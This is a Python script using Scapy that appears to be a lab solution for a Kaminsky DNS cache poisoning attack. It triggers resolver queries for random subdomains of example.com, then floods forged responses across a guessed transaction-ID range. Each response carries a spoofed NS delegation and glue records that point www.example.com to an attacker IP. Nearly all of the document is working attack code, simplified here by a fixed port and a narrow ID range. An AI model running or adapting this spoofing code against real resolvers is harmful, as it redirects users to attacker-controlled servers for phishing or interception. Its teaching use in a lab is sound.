#!/usr/bin/python3
"""
Attack overview (Kaminsky 2008):
  The classic cache poisoning difficulty is that you must guess both the
  Transaction ID (TXID) and the source port, and you only get one attempt
  per domain before the answer is cached and the query is never re-issued.

  Kaminsky's insight: instead of targeting the fixed domain, repeatedly query random sub-labels.  
  Because these are non-existent, the resolver queries the authoritative server fresh each time 
  - giving the attacker infinite retries.  
  Each attempt floods forged responses across the entire TXID space.

  The forged response includes an AUTHORITY section that redirects the resolver
  to a malicious NS for example.com, and an ADDITIONAL section that glues the
  malicious NS to FAKE_IP **and** sets an A record for www.example.com directly.
  If any forged packet matches the TXID before the real reply arrives, the
  resolver caches the poisoned NS (and the glue), so future lookups for
  www.example.com are served from our attacker IP.

  This lab simplifies the attack by:
    1. Fixing the resolver source port at 33333
    2. Limiting the TXID range to [10000, 10005]

We verify from the client:
    dig @10.19.0.53 www.example.com +short   # and should return 6.6.6.6
"""

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
import random
import string
import time

RESOLVER_IP = "10.19.0.53"
AUTH_SERVER_IP = "10.19.0.153"
TARGET_ZONE = "example.com"
TARGET_NAME = "www.example.com"     # Domain we ultimately want to poison
FAKE_IP = "6.6.6.6"                 # Attacker-controlled IP to inject
MALICIOUS_NS = "ns.attacker.example.com"
TXID_MIN = 10000
TXID_MAX = 10005
MAX_ATTEMPTS = 30
RESOLVER_FIXED_PORT = 33333 


def random_label(length=8):
    """Generate a random alphanumeric label to use as a unique subdomain.

    Each iteration of the attack needs a *fresh* subdomain that the resolver
    has not yet cached, so it will issue a new upstream query we can race.
    """
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def trigger_random_query(name):
    """Send a DNS A query for `name` to the resolver without waiting for a reply.

    We fire-and-forget: the goal is purely to cause the resolver to issue an
    upstream query to the authoritative server (which we will race with forgeries).
    Waiting for a response would waste time inside the race window.
    """
    pkt = (
        IP(dst=RESOLVER_IP)
        / UDP(sport=random.randint(1024, 65535), dport=53)
        / DNS(
            rd=1,  # Recursion Desired - resolver must forward to authoritative
            qd=DNSQR(qname=name, qtype="A", qclass="IN"),
        )
    )
    send(pkt, verbose=0)


def flood_spoofed_responses(victim_name):
    """Send forged DNS responses across the full TXID range to poison the cache.

    For each possible TXID in [TXID_MIN, TXID_MAX] we build a response that:
      - Answers the victim_name query (ANSWER section) - this satisfies the
        resolver's immediate lookup so it accepts the packet.
      - Delegates authority for example.com to MALICIOUS_NS (AUTHORITY section).
      - Provides glue records mapping MALICIOUS_NS -> FAKE_IP and
        TARGET_NAME -> FAKE_IP (ADDITIONAL section).

    If any packet matches the in-flight TXID the resolver is waiting on, the
    resolver caches both the delegation (NS record) and the glue (A records).
    Subsequent lookups for www.example.com then bypass the real authoritative
    server entirely and return FAKE_IP.

    We send each packet set 4 times to improve odds over the tiny race window.
    """
    # Mirrors what the resolver originally asked
    qd = DNSQR(qname=victim_name, qtype="A", qclass="IN")

    # a valid-looking A record for the random subdomain
    # (gives the resolver a plausible reason to accept this response)
    an = DNSRR(rrname=victim_name, type="A", rclass="IN", ttl=60, rdata=FAKE_IP)

    # AUTHORITY section - redirects example.com NS to our malicious nameserver
    # This is the core of the Kaminsky attack: which is poisoning the NS delegation
    ns = DNSRR(rrname=TARGET_ZONE, type="NS", rclass="IN", ttl=86400, rdata=MALICIOUS_NS)

    # An ADDITIONAL section (glue) - two records:
    #   1. A record for MALICIOUS_NS so the resolver knows where to reach it
    ar_ns = DNSRR(rrname=MALICIOUS_NS, type="A", rclass="IN", ttl=86400, rdata=FAKE_IP)

    #   2. A record for TARGET_NAME directly, short-circuiting future lookups
    ar_www = DNSRR(rrname=TARGET_NAME, type="A", rclass="IN", ttl=86400, rdata=FAKE_IP)

    # Build one forged packet per TXID value in the known range
    packets = []
    for txid in range(TXID_MIN, TXID_MAX + 1):
        packets.append(
            IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
            / UDP(sport=53, dport=RESOLVER_FIXED_PORT)
            / DNS(
                id=txid,
                qr=1, 
                aa=1, 
                rd=1,
                ra=1,
                qd=qd,
                ancount=1,
                nscount=1,
                arcount=2,
                an=an,
                ns=ns,
                ar=ar_ns / ar_www,  # Chain both additional records
            )
        )
    for _ in range(4):
        send(packets, verbose=0)


def check_poisoned():
    """Query the resolver for TARGET_NAME and check if the cache is poisoned.

    Sends a standard recursive A query and inspects the first answer record.
    If the returned IP matches FAKE_IP, the poisoning succeeded.
    """
    resp = sr1(
        IP(dst=RESOLVER_IP)
        / UDP(sport=random.randint(1024, 65535), dport=53)
        / DNS(
            rd=1,
            qd=DNSQR(qname=TARGET_NAME, qtype="A", qclass="IN"),
        ),
        timeout=2,
        verbose=0,
    )

    if resp is None or not resp.haslayer(DNS):
        return False, None

    dns = resp[DNS]
    if dns.ancount == 0 or dns.an is None:
        return False, None

    # Extract the IP from the first answer record
    observed = str(dns.an.rdata)
    return observed == FAKE_IP, observed


if __name__ == "__main__":
    print("Kaminsky demo started")
    print(f"Resolver TXID range assumed: [{TXID_MIN}, {TXID_MAX}]")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        # Use a fresh random subdomain so the resolver always issues a new upstream query
        victim = f"{random_label()}.{TARGET_ZONE}"
        print(f" Attempt {attempt}/{MAX_ATTEMPTS}: {victim}")

        # Step 1: trigger the resolver to issue an upstream query we can race
        trigger_random_query(victim)

        # Step 2: flood forged responses across the entire TXID range immediately
        flood_spoofed_responses(victim)

        # Step 3: check whether TARGET_NAME is now cached with FAKE_IP
        ok, observed = check_poisoned()
        if ok:
            print(f"SUCCESS: {TARGET_NAME} -> {observed}")
            break
        print(f"Not poisoned yet (observed: {observed})")
        time.sleep(0.1)
    else:
        print("Failed to poison cache within attempts")
